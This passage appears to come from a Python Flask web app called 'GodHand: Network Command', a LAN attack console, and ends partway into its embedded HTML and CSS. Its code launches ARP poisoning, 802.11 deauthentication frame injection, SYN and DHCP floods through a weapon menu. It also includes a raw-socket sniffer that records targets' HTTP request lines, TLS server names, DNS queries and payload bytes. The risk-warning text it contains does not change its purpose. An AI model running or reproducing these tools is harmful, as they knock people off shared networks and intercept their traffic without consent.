        sock.bind((IFACE, 0))
        sock.setblocking(0)

        print(f"Port Monitor: Listening for all traffic on port {{PORT}}", file=sys.stderr)
        pkt_no = 0
        start_time = time.time()

        while True:
            r, _, _ = select.select([sock], [], [], 0.5)
            if not r:
                # Every 2 seconds, print statistics
                if pkt_no % 20 == 0:
                    now = time.time()
                    elapsed = now - start_time
                    if elapsed > 0 and devices:
                        print(f"[{{\int(elapsed)}}s] {{len(devices)}} devices, {{sum(d['packets'] for d in devices.values())}} packets", file=sys.stderr)
                continue

            try:
                data = sock.recvfrom(65535)[0]
                if len(data) < 38:
                    continue

                # Parse IP header
                if struct.unpack('!H', data[12:14])[0] != 0x0800:
                    continue  # Not IPv4

                proto = data[23]
                if proto not in (6, 17, 1):  # Not TCP, UDP, or ICMP
                    continue

                src_ip = socket.inet_ntoa(data[26:30])
                dst_ip = socket.inet_ntoa(data[30:34])

                # Parse ports (TCP/UDP only)
                src_port = None
                dst_port = None

                if proto in (6, 17) and len(data) >= 42:  # TCP or UDP
                    src_port, dst_port = struct.unpack('!HH', data[34:38])

                # Filter: only packets where source OR destination port matches
                if not ((src_port == PORT) or (dst_port == PORT)):
                    continue

                # Track this connection
                key = (src_ip, dst_ip)
                proto_name = PROTO_NAMES.get(proto, f'proto_{proto}')

                if key not in devices:
                    devices[key] = {{
                        'src_ip': src_ip,
                        'dst_ip': dst_ip,
                        'src_port': src_port,
                        'dst_port': dst_port,
                        'proto': proto_name,
                        'packets': 0,
                        'bytes': 0,
                        'first_seen': time.time(),
                        'last_seen': time.time(),
                        'is_outbound': dst_port == PORT  # True if going TO port
                    }}

                # Update counters
                pkt_len = struct.unpack('!H', data[16:18])[0]
                devices[key]['packets'] += 1
                devices[key]['bytes'] += pkt_len
                devices[key]['last_seen'] = time.time()

                pkt_no += 1

                # Log entry for UI
                entry = {{
                    'no': pkt_no,
                    't': time.time(),
                    'src': src_ip,
                    'dst': dst_ip,
                    'src_port': src_port or 'N/A',
                    'dst_port': dst_port or 'N/A',
                    'proto': proto_name,
                    'bytes': pkt_len,
                    'direction': 'outbound' if dst_port == PORT else 'inbound',
                    'port': PORT
                }}

                # Write to log file
                with open('{log_path}', 'a') as f:
                    f.write(json.dumps(entry) + '\\n')

            except Exception as e:
                print(f"Error: {{e}}", file=sys.stderr)

        sock.close()
    """)

    fd, path = tempfile.mkstemp(suffix='.py')
    os.close(fd)
    with open(path, 'w') as f:
        f.write(script)

    proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(0.5)
    if proc.poll() is not None:
        raise RuntimeError(f'Port monitor process exited immediately')

    threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
    add_log('info', f'Port monitor started (PID {proc.pid}): listening for all traffic on port {port}')
    return proc

def start_attack_monitor(targets, port, iface):
    add_log('info', f'Starting Traffic Capture on {iface} for {len(targets)} target(s)')
    if not set_monitor(iface, True, raise_on_fail=False):
        add_log('warn', 'Monitor mode could not be enabled; capture may be incomplete')
    with STATE_LOCK:
        STATE['monitor_entries'] = []
    # Use a writable temp directory
    tmpdir = tempfile.gettempdir()
    log_path = os.path.join(tmpdir, f"godhand_monitor_{int(time.time())}.log")
    # Captures ALL TCP/UDP/ICMP traffic to/from the targets (not just one port) --
    # a single-port filter would defeat the point of a top-ports breakdown. IPv4
    # only, and assumes no IP options (20-byte header) -- covers the overwhelming
    # majority of home-LAN traffic without the complexity of a full IHL/IPv6 parser.
    script = textwrap.dedent(f"""
        import socket, struct, select, time, sys, json
        IFACE = '{iface}'
        TARGETS = set({targets})
        PROTO_NAMES = {{6: 'tcp', 17: 'udp', 1: 'icmp'}}
        ICMP_TYPES = {{0: 'echo-reply', 3: 'dest-unreachable', 8: 'echo-request', 11: 'time-exceeded'}}
        HTTP_METHODS = (b'GET ', b'POST ', b'PUT ', b'HEAD ', b'DELETE ', b'OPTIONS ', b'PATCH ', b'CONNECT ')

        def parse_http(payload):
            try:
                if len(payload) < 4:
                    return None
                head = payload[:16]
                if not (head.startswith(HTTP_METHODS) or head.startswith(b'HTTP/1.')):
                    return None
                end = payload.find(b'\\r\\n')
                if end == -1:
                    end = payload.find(b'\\n')
                if end == -1 or end > 200:
                    return None
                line = payload[:end].decode('ascii', 'replace').strip()
                return line or None
            except Exception:
                return None

        def parse_dns_query(payload):
            try:
                if len(payload) < 13:
                    return None
                pos = 12
                labels = []
                while pos < len(payload):
                    length = payload[pos]
                    if length == 0:
                        break
                    if length & 0xC0:
                        break
                    pos += 1
                    labels.append(payload[pos:pos + length].decode('ascii', 'replace'))
                    pos += length
                return '.'.join(labels) if labels else None
            except Exception:
                return None

        def parse_tls_sni(payload):
            # TLS record (Handshake) -> Handshake (ClientHello) -> extensions -> server_name (type 0x0000)
            try:
                if len(payload) < 6 or payload[0] != 0x16 or payload[5] != 0x01:
                    return None
                pos = 9 + 2 + 32  # skip record(5)+handshake-hdr(4), client_version(2), random(32)
                if pos >= len(payload):
                    return None
                pos += 1 + payload[pos]  # session_id
                if pos + 2 > len(payload):
                    return None
                cipher_len = struct.unpack('!H', payload[pos:pos + 2])[0]
                pos += 2 + cipher_len
                if pos >= len(payload):
                    return None
                pos += 1 + payload[pos]  # compression methods
                if pos + 2 > len(payload):
                    return None
                ext_total_len = struct.unpack('!H', payload[pos:pos + 2])[0]
                pos += 2
                ext_end = min(pos + ext_total_len, len(payload))
                while pos + 4 <= ext_end:
                    ext_type, ext_len = struct.unpack('!HH', payload[pos:pos + 4])
                    pos += 4
                    if ext_type == 0x0000:
                        sni_pos = pos + 2 + 1  # server_name_list len(2) + name_type(1)
                        if sni_pos + 2 > len(payload):
                            return None
                        name_len = struct.unpack('!H', payload[sni_pos:sni_pos + 2])[0]
                        start = sni_pos + 2
                        return payload[start:start + name_len].decode('ascii', 'replace') or None
                    pos += ext_len
            except Exception:
                return None
            return None

        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        sock.bind((IFACE, 0))
        pkt_no = 0
        while True:
            r, _, _ = select.select([sock], [], [], 0.5)
            if not r:
                continue
            data = sock.recvfrom(65535)[0]
            if len(data) < 38:
                continue
            if struct.unpack('!H', data[12:14])[0] != 0x0800:
                continue
            src_ip = socket.inet_ntoa(data[26:30])
            dst_ip = socket.inet_ntoa(data[30:34])
            if src_ip not in TARGETS and dst_ip not in TARGETS:
                continue
            proto = PROTO_NAMES.get(data[23])
            if proto is None:
                continue
            length = struct.unpack('!H', data[16:18])[0]
            pkt_no += 1
            entry = {{'no': pkt_no, 't': time.time(), 'src': src_ip, 'dst': dst_ip, 'proto': proto, 'len': length}}
            if proto in ('tcp', 'udp'):
                sp, dp = struct.unpack('!HH', data[34:38])
                entry['sp'] = sp
                entry['dp'] = dp
                if proto == 'tcp' and len(data) >= 48:
                    entry['seq'] = struct.unpack('!I', data[38:42])[0]
                    flag_byte = data[47]
                    flags = []
                    if flag_byte & 0x02: flags.append('SYN')
                    if flag_byte & 0x10: flags.append('ACK')
                    if flag_byte & 0x01: flags.append('FIN')
                    if flag_byte & 0x04: flags.append('RST')
                    if flag_byte & 0x08: flags.append('PSH')
                    if flag_byte & 0x20: flags.append('URG')
                    entry['flags'] = flags
                    tcp_header_len = max(5, data[46] >> 4) * 4
                    payload_start = 34 + tcp_header_len
                    if len(data) > payload_start:
                        payload = data[payload_start:]
                        # Capped at 2048B/segment -- plenty for HTTP headers plus a
                        # meaningful chunk of a typical short body, without letting a
                        # large transfer blow up the capture log. Kept separately from
                        # http_info/tls_sni below since reassembly needs the raw bytes,
                        # not just what a single segment's own first line shows.
                        entry['payload_hex'] = payload[:2048].hex()
                        http_line = parse_http(payload)
                        if http_line:
                            entry['http_info'] = http_line
                        else:
                            sni = parse_tls_sni(payload)
                            if sni:
                                entry['tls_sni'] = sni
                elif proto == 'udp' and (sp == 53 or dp == 53) and len(data) > 42:
                    query = parse_dns_query(data[42:])
                    if query:
                        entry['dns_query'] = query
            elif proto == 'icmp':
                icmp_type = data[34]
                entry['icmp_type'] = ICMP_TYPES.get(icmp_type, f'type-{{icmp_type}}')
            print(json.dumps(entry))
            sys.stdout.flush()
    """)
    fd, path = tempfile.mkstemp(suffix='.py')
    os.close(fd)
    with open(path, 'w') as f:
        f.write(script)
    try:
        log_file = open(log_path, 'w')
    except Exception as e:
        raise RuntimeError(f'Cannot open log file {log_path}: {e}')
    proc = subprocess.Popen(['python3', path], stdout=log_file, stderr=subprocess.PIPE)
    time.sleep(0.5)
    if proc.poll() is not None:
        raise RuntimeError('Monitor script exited immediately')
    update_state('monitor_log_path', log_path)
    threading.Thread(target=lambda: (proc.wait(), log_file.close(), os.unlink(path)), daemon=True).start()
    def update_monitor_log():
        last_pos = 0
        while proc.poll() is None:
            try:
                with open(log_path, 'r') as lf:
                    lf.seek(last_pos)
                    new_lines = lf.readlines()
                    last_pos = lf.tell()
                    if new_lines:
                        entries = []
                        for line in new_lines:
                            try:
                                e = json.loads(line)
                            except ValueError:
                                continue
                            e['dir'] = 'out' if e['src'] in targets else 'in'
                            entries.append(e)
                        if entries:
                            with STATE_LOCK:
                                STATE['monitor_entries'] = (STATE['monitor_entries'] + entries)[-500:]
            except:
                pass
            time.sleep(0.5)
    threading.Thread(target=update_monitor_log, daemon=True).start()
    return [proc]

def run_attack(weapon_id, targets, gateway, port, iface):
    if not targets:
        raise ValueError('No targets')
    if weapon_id == 1:
        return start_attack_arp_freeze(targets, gateway, iface)
    elif weapon_id == 2:
        return start_attack_deauth(targets, gateway, iface)
    elif weapon_id == 3:
        return start_attack_syn_flood(targets, port, iface)
    elif weapon_id == 4:
        return start_attack_dhcp_storm(targets, gateway, iface)
    elif weapon_id == 5:
        return start_attack_monitor(targets, port, iface)
    return None

def assess_attack_risk(weapon_id, targets, gateway, iface):
    """Return a human-readable risk warning if this attack could disrupt something
    the operator likely didn't intend to hit, or None if there's nothing to flag.

    This is deliberately conservative (only flags what's foreseeable and concrete --
    the gateway or this device's own IP in the target list, or an attack that is
    inherently network-wide) rather than a blanket confirmation on every attack:
    the goal is an informed choice, not friction for its own sake.
    """
    my_ip = None
    if iface:
        my_ip, _ = get_my_ip_and_cidr(iface)
        if my_ip == '0.0.0.0':
            my_ip = None
    notes = []
    if weapon_id == 4:
        notes.append(
            "DHCP Storm exhausts the gateway's entire DHCP address pool. Every device on "
            "this network -- including this one, if its lease needs to renew during the "
            "attack -- can lose network access until you stop it."
        )
    else:
        if gateway and gateway in targets:
            notes.append(
                f"Your target list includes this network's gateway ({gateway}). Attacking "
                "the gateway directly can cut off internet/LAN access for every device on "
                "this network, including this one."
            )
        elif my_ip and my_ip in targets:
            notes.append(
                f"Your target list includes this device's own IP ({my_ip}). This attack "
                "could disconnect this device itself -- including from the app you're using "
                "to control it right now."
            )
    active_services = []
    if gateway_dns_status().get('unbound') or gateway_dns_status().get('dnscrypt'):
        active_services.append('the Gateway DNS stack')
    if gateway_proxy_status().get('tinyproxy'):
        active_services.append('the network-wide proxy')
    if proc_running('ngrok'):
        active_services.append('the ngrok tunnel')
    ddns_cfg = get_state('ddns')
    if ddns_cfg and ddns_cfg.get('enabled'):
        active_services.append('DDNS auto-update')
    if active_services:
        notes.append(
            'Currently active and depending on this network staying up: ' +
            ', '.join(active_services) + '. Disrupting the gateway or this device may '
            'interrupt those too, for anyone relying on them.'
        )
    return ' '.join(notes) if notes else None

def kill_attack(pids):
    for proc in pids:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except:
            try:
                proc.kill()
            except:
                pass

# ---------- kick & block with verification ----------
def arp_kick_burst(ip, gateway, iface, duration=6):
    """Bounded ARP-poison burst: the fallback kick for the common case on stock
    Android Wi-Fi hardware -- client mode, no monitor mode/injection support at
    all in the driver. This is a network-layer disconnect (the target stays
    associated to the AP at the 802.11 level but can't reach anything through
    it), not a real deauth, and it is less durable than one: nothing stops the
    target from working again the instant the burst ends, whereas a real
    deauth forces an actual re-association. It is, however, the one technique
    that works from ordinary client mode with no special hardware or root
    beyond what raw sockets already need -- the same mechanism ARP Freeze uses.
    """
    if not gateway:
        raise RuntimeError('Gateway not set -- required for the ARP-based kick fallback.')
    if ensure_tool('arpspoof', 'dsniff'):
        procs = [
            subprocess.Popen(['arpspoof', '-i', iface, '-t', ip, gateway], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
            subprocess.Popen(['arpspoof', '-i', iface, '-t', gateway, ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL),
        ]
        time.sleep(duration)
        for p in procs:
            p.terminate()
        for p in procs:
            try:
                p.wait(timeout=2)
            except Exception:
                p.kill()
        return
    # Fallback with Android compatibility
    fake_mac = '02:00:00:00:00:01'
    script = textwrap.dedent(f"""
        import socket, struct, time, sys, os
        IFACE = '{iface}'
        GATEWAY = '{gateway}'
        TARGET = '{ip}'
        FAKE = bytes.fromhex('{fake_mac.replace(':', '')}')

        def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
            try:
                eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
                arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
                arp += src_mac + socket.inet_aton(src_ip)
                arp += dst_mac + socket.inet_aton(dst_ip)
                packet = eth + arp

                # Try AF_PACKET first (Linux native)
                try:
                    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
                    s.bind((IFACE, 0))
                    s.send(packet)
                    s.close()
                    return True
                except (OSError, PermissionError):
                    pass

                # Fallback to AF_INET (works on some Android devices)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                    s.sendto(packet, (dst_ip, 0))
                    s.close()
                    return True
                except (OSError, PermissionError):
                    pass

                # Last resort: use ping to trigger ARP (less reliable but works on restricted devices)
                try:
                    os.system(f'ping -c 1 -W 1 {{dst_ip}} 2>/dev/null &')
                    return True
                except:
                    pass

                return False
            except Exception as e:
                print(f'ARP send failed: {{e}}', file=sys.stderr)
                return False

        end = time.time() + {duration}
        while time.time() < end:
            send_arp(2, GATEWAY, TARGET, FAKE, b'\\xff'*6)
            send_arp(2, TARGET, GATEWAY, FAKE, b'\\xff'*6)
            time.sleep(0.3)
    """)
    fd, path = tempfile.mkstemp(suffix='.py')
    os.close(fd)
    with open(path, 'w') as f:
        f.write(script)
    try:
        res = subprocess.run(['python3', path], stderr=subprocess.PIPE, timeout=duration + 5)
        if res.returncode != 0:
            stderr = res.stderr.decode(errors='ignore')
            raise RuntimeError(f'ARP-based kick fallback failed: {stderr[-300:]}')
    finally:
        try:
            os.unlink(path)
        except:
            pass

def kick_client(ip, mac, iface):
    add_log('info', f'Attempting to kick {ip} ({mac})')
    iface_type = get_iface_type(iface)
    if iface_type == 'AP':
        # This interface is our own access point -- kick the station natively via
        # the kernel, no monitor mode. Never fall back to monitor mode here: flipping
        # an AP interface into monitor mode would drop every connected client, not
        # just this one.
        if mac.lower() not in list_ap_stations(iface):
            raise RuntimeError(f'{iface} is running as an access point, but {mac} is not currently an associated station on it.')
        add_log('info', f'{iface} is in AP mode -- using native kernel deauth (station-del), no monitor mode')
        if not native_deauth_station(iface, mac):
            raise RuntimeError(f'Native deauth (station-del) failed for {mac} on {iface}')
        add_log('success', f'Sent native deauth to {mac}')
        time.sleep(2)
        reachable = server_ping(ip, timeout=1)
        if reachable:
            add_log('warn', f'Target {ip} is still responding to ping after kick')
            return False
        add_log('success', f'Target {ip} is not responding to ping after kick')
        return True

    if not check_monitor_support(iface):
        # Stock Android Wi-Fi chipsets essentially never expose monitor mode/frame
        # injection to mac80211 -- there is no software trick that makes a real
        # 802.11 deauth possible here. Fall back to the one technique that does
        # work from ordinary client mode: a bounded ARP-poison burst that cuts
        # the target's network access for a few seconds, same mechanism ARP
        # Freeze uses. Clearly labeled as a fallback, not silently substituted.
        add_log('warn', f'{iface} does not support monitor mode/frame injection (typical for a phone\'s built-in Wi-Fi) -- falling back to a brief ARP-based disconnect for {mac}, not a true 802.11 deauth')
        arp_kick_burst(ip, STATE['gateway'], iface)
        time.sleep(1)
        reachable = server_ping(ip, timeout=1)
        if reachable:
            add_log('warn', f'Target {ip} is still responding to ping after the ARP-based kick')
            return False
        add_log('success', f'Target {ip} is not responding to ping after the ARP-based kick')
        return True
    if not set_monitor(iface, True, raise_on_fail=True):
        raise RuntimeError('Cannot enable monitor mode')
    # Any failure past this point must still return the interface to managed mode,
    # or the phone's Wi-Fi is left stranded in monitor mode (disconnected). Every
    # error path below resets it before raising, and the success path resets at the
    # end -- subprocess timeouts are converted to clean errors rather than allowed
    # to propagate out with the interface still in monitor mode.
    if ensure_tool('aireplay-ng', 'aircrack-ng'):
        cmd = ['aireplay-ng', '-0', '5', '-a', 'FF:FF:FF:FF:FF:FF', '-c', mac, iface]
        try:
            res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
        except subprocess.TimeoutExpired:
            set_monitor(iface, False)
            raise RuntimeError('aireplay-ng deauth timed out')
        if res.returncode != 0:
            set_monitor(iface, False)
            raise RuntimeError('aireplay-ng deauth failed: ' + res.stderr.decode())
    else:
        script = textwrap.dedent(f"""
            import socket, struct, time
            IFACE = '{iface}'
            MAC = '{mac}'
            dst_mac = bytes.fromhex(MAC.replace(':', ''))
            radiotap = b'\\x00\\x00\\x0c\\x00\\x04\\x80\\x00\\x00\\x00'
            def pkt(dst, seq):
                frame_control = struct.pack('<H', 0x00c0)
                duration = b'\\x00\\x00'
                seq_control = struct.pack('<H', seq & 0xfff)
                reason = struct.pack('<H', 7)
                bssid = b'\\xff'*6
                frame = frame_control + duration + dst + bssid + bssid + seq_control + reason
                return radiotap + frame
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((IFACE, 0))
            for i in range(20):
                sock.send(pkt(dst_mac, i))
                sock.send(pkt(b'\\xff'*6, i))
                time.sleep(0.05)
            sock.close()
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        try:
            res = subprocess.run(['python3', path], stderr=subprocess.PIPE, timeout=10)
        except subprocess.TimeoutExpired:
            os.unlink(path)
            set_monitor(iface, False)
            raise RuntimeError('Deauth fallback script timed out')
        os.unlink(path)
        if res.returncode != 0:
            set_monitor(iface, False)
            raise RuntimeError('Deauth fallback script failed')
    set_monitor(iface, False)
    time.sleep(2)
    reachable = server_ping(ip, timeout=1)
    if reachable:
        add_log('warn', f'Target {ip} is still responding to ping after kick')
        return False
    else:
        add_log('success', f'Target {ip} is not responding to ping after kick')
        return True

def block_mac(mac):
    if not mac:
        raise ValueError('No MAC')
    add_log('info', f'Toggling block for MAC {mac}')
    with STATE_LOCK:
        currently_blocked = mac in STATE['blocked_macs']
    if currently_blocked:
        subprocess.run(['iptables', '-D', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                       stderr=subprocess.PIPE, timeout=5)
        subprocess.run(['iptables', '-D', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                       stderr=subprocess.PIPE, timeout=5)
        check = subprocess.run(['iptables', '-C', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                               stderr=subprocess.PIPE, timeout=5)
        if check.returncode == 0:
            raise RuntimeError('Failed to remove iptables rule')
        discard_from_set('blocked_macs', mac)
        add_log('success', f'Unblocked {mac}')
        return False
    else:
        subprocess.run(['iptables', '-I', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                       stderr=subprocess.PIPE, timeout=5)
        subprocess.run(['iptables', '-I', 'FORWARD', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                       stderr=subprocess.PIPE, timeout=5)
        check = subprocess.run(['iptables', '-C', 'INPUT', '-m', 'mac', '--mac-source', mac, '-j', 'DROP'],
                               stderr=subprocess.PIPE, timeout=5)
        if check.returncode != 0:
            raise RuntimeError('Failed to insert iptables rule')
        add_to_set('blocked_macs', mac)
        add_log('success', f'Blocked {mac}')
        return True

# ---------- Flask routes ----------
@app.route('/')
def index():
    # The entire HTML/CSS/JS is embedded as a raw string to avoid escape issues.
    html_template = r'''
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<title>GodHand: Network Command</title>
<style>
:root {
  /* palette sampled directly from the login/app background photo (app-bg-photo) */
  --bg-base: #011236;
  --bg-elevated: rgba(40,40,45,0.55);
  --bg-inset: rgba(255,255,255,0.05);
  --border-subtle: rgba(255,255,255,0.12);
  --border-strong: rgba(255,255,255,0.22);
  --text-primary: #CAEFFB;
  --text-secondary: #80B9E8;
  --text-disabled: #5E7EBA;
  --accent-primary: #54B4EC;
  --accent-secondary: #0483E0;
  --accent-tertiary: #B2E7F9;
  --success: #26BBAE;
  --warning: #BB8B5A;
  --danger: #942329;
  --info: #818CF8;
  --special: #C084FC;
  --glow-accent: rgba(84,180,236,0.15);
  --glow-danger: rgba(148,35,41,0.15);
  --glow-success: rgba(38,187,174,0.15);
  --radius: 12px;
  --shadow: 0 4px 12px rgba(0,0,0,0.3), 0 1px 0 rgba(255,255,255,0.08) inset;
  --glass-blur: blur(20px) saturate(160%);
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  background: var(--bg-base);
  color: var(--text-primary);
  font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'SF Pro Text', 'Helvetica Neue', Helvetica, Arial, sans-serif;
  -webkit-font-smoothing: antialiased;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
}
body.attack-active {
  background: #8b2323;
  transition: background 0.3s;
}
body.attack-active .btn {
  background: linear-gradient(135deg, #c44545, #a63636) !important;
  color: #ffffff;
}
body.attack-active .btn:hover {
  background: linear-gradient(135deg, #d45555, #b64646) !important;
}
body.attack-active .btn.secondary {
  background: transparent;
  border-color: rgba(255,255,255,0.3);
}
body.attack-active .btn.danger {
  background: linear-gradient(135deg, #d45555, #b64646) !important;
}

/* ---------- login ---------- */
.login-screen {
  position: fixed;
  inset: 0;
  z-index: 1000;
  display: flex;
  align-items: center;
  justify-content: center;
  overflow: hidden;
}
.app-bg {
  position: fixed;
  inset: 0;
  z-index: -1;
  background: var(--bg-base);
  overflow: hidden;
}
.app-bg-photo {
  position: absolute;
  inset: -2%;
  background-image: url(data:image/jpeg;base64,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